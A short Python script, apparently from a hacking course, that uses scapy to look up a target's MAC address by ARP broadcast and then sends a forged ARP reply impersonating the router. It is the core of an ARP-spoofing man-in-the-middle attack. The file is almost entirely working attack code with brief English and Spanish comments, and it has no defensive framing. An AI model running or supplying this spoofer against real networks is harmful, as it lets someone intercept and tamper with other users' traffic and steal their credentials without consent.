#!/usr/bin/env python

import scapy.all as scapy

def get_mac(ip):
    #use ARP to ask who has target IP
    arp_request = scapy.ARP(pdst=ip)
    #set destination MAC to brodcast MAC
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')#instance of internet
    arp_request_broadcast = broadcast/arp_request
    #enviar el paquete y recibir la respuesta
    answered_list = scapy.srp(arp_request_broadcast, timeout=1)[0]
    #extract list(array)
    return answered_list[0][1].hwsrc



def spoof(target_ip, spoof_ip):
    #get target mac
    target_mac = get_mac(target_ip)
    # redirect packets ARP response, destination ip, hardware destination, source ip (router)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip )
    scapy.send(packet)





